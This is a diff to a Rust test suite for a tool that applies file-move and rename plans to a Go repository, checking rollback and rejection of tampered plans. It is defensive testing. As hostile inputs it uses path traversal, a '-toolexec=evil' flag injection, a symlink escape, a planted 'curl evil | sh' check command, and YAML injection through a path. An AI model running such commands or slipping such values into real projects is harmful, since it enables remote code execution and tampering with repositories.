@@ -8,7 +8,7 @@ use std::sync::atomic::{AtomicUsize, Ordering};
 
 use serde_json::Value;
 
-use super::atomic_apply::{ApplyOptions, apply};
+use super::atomic_apply::{ApplyOptions, apply, apply_with};
 use super::plan::sha256_hex;
 use super::types::{ApplyStatus, MovePlan, PlanStepKind};
 use super::*;
@@ -353,36 +353,60 @@ fn base_move_plan(root: &Path) -> MovePlan {
     .unwrap()
 }
 
+/// Applies `plan` but fails the `n`th file write (rename) with an I/O error.
+fn apply_failing_write(
+    plan: &MovePlan,
+    root: &Path,
+    n: usize,
+) -> anyhow::Result<types::ApplyResult> {
+    let seen = AtomicUsize::new(0);
+    let rename = |from: &Path, to: &Path| {
+        if seen.fetch_add(1, Ordering::SeqCst) == n {
+            return Err(std::io::Error::other("injected rename failure"));
+        }
+        std::fs::rename(from, to)
+    };
+    apply_with(plan, root, &ApplyOptions::default(), &rename)
+}
+
+fn write_count(plan: &MovePlan) -> usize {
+    plan.steps
+        .iter()
+        .filter(|s| s.transform.new_content.is_some())
+        .count()
+}
+
 #[test]
-fn failure_at_every_step_restores_the_tree_byte_for_byte() {
+fn failure_at_every_write_restores_the_tree_byte_for_byte() {
     let root = input_copy("base");
     let plan = base_move_plan(&root);
     let kinds: Vec<PlanStepKind> = plan.steps.iter().map(|s| s.kind).collect();
     assert!(kinds.contains(&PlanStepKind::RewriteFile) && kinds.contains(&PlanStepKind::MoveFile));
     let before = checksums(&root);
-    for i in 0..plan.steps.len() {
-        let err = apply(
-            &plan,
-            &root,
-            &ApplyOptions {
-                inject_failure_after_step: Some(i),
-                ..Default::default()
-            },
-        )
-        .expect_err("injected failure must surface");
-        assert!(
-            format!("{err:#}").contains("working tree restored"),
-            "{err:#}"
-        );
+    assert!(
+        write_count(&plan) >= 3,
+        "need several writes to fail between"
+    );
+    for n in 0..write_count(&plan) {
+        let err = apply_failing_write(&plan, &root, n).expect_err("injected failure must surface");
+        assert!(format!("{err:#}").contains("rolled back"), "{err:#}");
         assert_eq!(
             checksums(&root),
             before,
-            "tree changed after failure at step {i}"
+            "tree changed after failure at write {n}"
+        );
+        assert!(
+            !root.join(".kibitzer/plans").exists(),
+            "log directory left behind after failure at write {n}"
         );
     }
     // …and a clean apply still works afterwards (no leftover temp files or dirs in the way).
     let ok = apply(&plan, &root, &ApplyOptions::default()).unwrap();
     assert_eq!(ok.status, ApplyStatus::Applied);
+    assert!(
+        !root.join(".kibitzer/plans").exists(),
+        "log directory left behind after success"
+    );
 }
 
 #[test]
@@ -399,15 +423,7 @@ fn policy_update_failure_restores_the_tree() {
             && !policy.steps.is_empty()
     );
     let before = checksums(&root);
-    apply(
-        &policy,
-        &root,
-        &ApplyOptions {
-            inject_failure_after_step: Some(0),
-            ..Default::default()
-        },
-    )
-    .unwrap_err();
+    apply_failing_write(&policy, &root, 0).unwrap_err();
     assert_eq!(checksums(&root), before);
 }
 
@@ -466,6 +482,7 @@ fn failed_verification_reports_output_verbatim_and_rolls_back() {
         .find(|s| s.transform.new_path.as_deref() == Some("app/app.go"))
         .unwrap();
     step.transform.new_content = Some("package app\n\nfunc Run() { undefinedSymbol() }\n".into());
+    let plan = plan.sealed();
     let before = checksums(&root);
     let result = apply(
         &plan,
@@ -666,6 +683,7 @@ fn plans_cannot_write_outside_the_repo_or_inject_go_flags() {
     let root = input_copy("base");
     let mut plan = base_move_plan(&root);
     plan.steps[0].transform.new_path = Some("../escape.go".into());
+    let plan = plan.sealed();
     let before = checksums(&root);
     assert!(
         apply(&plan, &root, &ApplyOptions::default())
@@ -675,6 +693,7 @@ fn plans_cannot_write_outside_the_repo_or_inject_go_flags() {
     );
     let mut plan = base_move_plan(&root);
     plan.affected_packages = vec!["-toolexec=evil".into()];
+    let plan = plan.sealed();
     assert!(
         apply(&plan, &root, &ApplyOptions::default())
             .unwrap_err()
@@ -815,6 +834,7 @@ fn plans_may_only_touch_expected_files_and_never_through_symlinks() {
     let root = input_copy("base");
     let mut plan = base_move_plan(&root);
     plan.steps[0].transform.new_path = Some(".github/workflows/x.yml".into());
+    let plan = plan.sealed();
     assert!(
         apply(&plan, &root, &ApplyOptions::default())
             .unwrap_err()
@@ -829,6 +849,7 @@ fn plans_may_only_touch_expected_files_and_never_through_symlinks() {
     // A non-policy plan cannot carry policy steps (and so cannot skip verification).
     let mut plan = base_move_plan(&root);
     plan.steps[0].kind = PlanStepKind::PolicyUpdate;
+    let plan = plan.sealed();
     assert!(
         apply(&plan, &root, &ApplyOptions::default())
             .unwrap_err()
@@ -842,6 +863,7 @@ fn plans_may_only_touch_expected_files_and_never_through_symlinks() {
         std::os::unix::fs::symlink(&outside, root.join("esc")).unwrap();
         let mut plan = base_move_plan(&root);
         plan.steps[0].transform.new_path = Some("esc/dropped.go".into());
+        let plan = plan.sealed();
         let before = checksums(&root);
         assert!(
             apply(&plan, &root, &ApplyOptions::default())
@@ -872,4 +894,65 @@ fn moves_keep_file_permissions() {
         .mode()
         & 0o777;
     assert_eq!(mode, 0o600);
+}
+
+#[test]
+fn an_edited_plan_is_rejected_before_anything_is_written() {
+    let root = input_copy("base");
+    let before = checksums(&root);
+    let mut plan = base_move_plan(&root);
+    plan.steps[0].transform.new_content = Some("package x\n".into());
+    let err = apply(&plan, &root, &ApplyOptions::default()).unwrap_err();
+    assert!(
+        err.to_string().contains("plan_id does not match"),
+        "{err:#}"
+    );
+    assert_eq!(checksums(&root), before);
+}
+
+#[test]
+fn a_step_without_old_sha256_is_rejected_even_when_resealed() {
+    let root = input_copy("base");
+    let mut plan = base_move_plan(&root);
+    let step = plan
+        .steps
+        .iter_mut()
+        .find(|s| s.transform.old_path.is_some())
+        .unwrap();
+    step.transform.old_sha256 = None;
+    let err = apply(&plan.sealed(), &root, &ApplyOptions::default()).unwrap_err();
+    assert!(err.to_string().contains("old_sha256"), "{err:#}");
+}
+
+#[test]
+fn a_forged_sync_policy_plan_cannot_plant_check_commands() {
+    let root = input_copy("base");
+    let source =
+        plan_rename_pkg(&root, "example.com/m/lib", "example.com/m/core", None, None).unwrap();
+    let mut policy = plan_sync_policy(&root, &source).unwrap();
+    let step = policy
+        .steps
+        .iter_mut()
+        .find(|s| s.transform.new_path.as_deref() == Some(".kibitzer/inspect.json"))
+        .expect("the base fixture has an inspect.json to rewrite");
+    step.transform.new_content =
+        Some("{\"checks\":[{\"name\":\"x\",\"command\":\"curl evil | sh\"}]}\n".into());
+    let before = checksums(&root);
+    let err = apply(&policy.sealed(), &root, &ApplyOptions::default()).unwrap_err();
+    assert!(
+        err.to_string()
+            .contains("differs from what the tool derives"),
+        "{err:#}"
+    );
+    assert_eq!(checksums(&root), before);
+}
+
+#[test]
+fn path_mappings_that_would_inject_yaml_are_refused() {
+    let root = input_copy("base");
+    let mut source =
+        plan_rename_pkg(&root, "example.com/m/lib", "example.com/m/core", None, None).unwrap();
+    source.path_map[0].to = "example.com/m/core\n  evil-key: true".into();
+    let err = plan_sync_policy(&root, &source).unwrap_err();
+    assert!(err.to_string().contains("not valid in a path"), "{err:#}");
 }
